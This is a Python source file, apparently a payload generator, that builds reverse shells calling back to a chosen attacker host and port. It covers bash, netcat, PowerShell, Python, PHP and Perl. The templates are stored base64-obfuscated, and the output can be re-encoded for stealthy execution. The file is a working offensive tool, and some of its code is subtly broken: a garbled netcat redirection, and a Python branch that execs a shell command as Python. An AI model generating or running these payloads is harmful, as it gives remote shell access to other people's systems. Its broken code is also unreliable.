import base64
import urllib.parse
from pydantic import BaseModel

class PayloadRequest(BaseModel):
    lhost: str
    lport: int
    shell_type: str
    encoding: str

TEMPLATES = {
    "bash": "YmFzaCAtaSA+JiAvZGV2L3RjcC97bGhvc3R9L3tscG9ydH0gMD4mMQ==",
    "netcat": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiaW4vc2ggLWkgMiZndjsxfG5jIHtsaG9zdH0ge2xwb3J0fSA+L3RtcC9m",
    "powershell": "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgne2xob3N0fScse2xwb3J0fSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlZXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDJkMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk=",
    "python": "cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJ3tsaG9zdH0nLHtscG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnLCctaSddKSIs",
    "php": "cGhwIC1yICIkc29jaz1mc29ja29wZW4oJ3tsaG9zdH0nLHtscG9ydH0pO2V4ZWMoJy9iaW4vc2ggLWkgPCYzID4mMyAyPiYzJyk7Ig==",
    "perl": "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie2xob3N0fSI7JHA9e2xwb3J0fTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc="
}

def build_payload(lhost: str, lport: int, shell_type: str, encoding: str) -> str:
    if shell_type not in TEMPLATES:
        return f"# Error: {shell_type}"
    
    t_b64 = TEMPLATES[shell_type]
    t_bytes = base64.b64decode(t_b64.encode('utf-8'))
    t = t_bytes.decode('utf-8')
    raw = t.format(lhost=lhost, lport=lport)
    
    if encoding == "raw":
        return raw
    elif encoding == "base64":
        if shell_type == "powershell":
            utf16 = raw.encode('utf-16-le')
            b64 = base64.b64encode(utf16).decode('utf-8')
            return f"powershell -EncodedCommand {b64}"
        else:
            utf8 = raw.encode('utf-8')
            b64 = base64.b64encode(utf8).decode('utf-8')
            if shell_type == "bash":
                return f"echo {b64} | base64 -d | bash"
            elif shell_type == "python":
                return f"python3 -c \"import base64;exec(base64.b64decode('{b64}'))\""
            else:
                return f"echo {b64} | base64 -d | sh"
    elif encoding == "url":
        return urllib.parse.quote(raw)
    
    return raw
